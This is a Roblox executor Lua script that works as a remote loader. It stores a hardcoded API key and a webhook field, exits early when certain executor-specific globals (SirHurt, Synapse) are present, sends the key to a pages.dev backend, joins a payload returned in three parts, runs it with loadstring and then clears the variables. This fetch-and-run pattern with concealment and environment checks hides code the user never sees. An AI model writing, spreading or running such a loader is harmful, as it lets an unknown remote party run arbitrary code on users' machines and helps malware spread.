local CFG = getgenv().CFG or {}
CFG.allowed   = CFG.allowed  or {}
CFG.webhook   = CFG.webhook  or ""
CFG.api_key   = CFG.api_key  or "aszxcvfgtt56678ijBVXDSERFGHBNJIU87U666789IKJHcdsxder56789ijhgfdrf4r56789ikjhgvf"
CFG.backend   = "https://miguelhohohoho.pages.dev"
getgenv().CFG = CFG

local _d = {"is_sirhurt_closure","is_synapse_function","getsynapseglobal","pebc_isexecutorclosure"}
for _, v in ipairs(_d) do
    if getgenv()[v] then return end
end

local hs = game:GetService("HttpService")
local ok, res = pcall(function()
    return hs:PostAsync(
        CFG.backend .. "/payload",
        hs:JSONEncode({ key = CFG.api_key }),
        Enum.HttpContentType.ApplicationJson
    )
end)
if not ok then return end

local parts = hs:JSONDecode(res)
local payload = parts.a .. parts.b .. parts.c
local fn = loadstring(payload)
parts = nil
payload = nil
if fn then fn() end
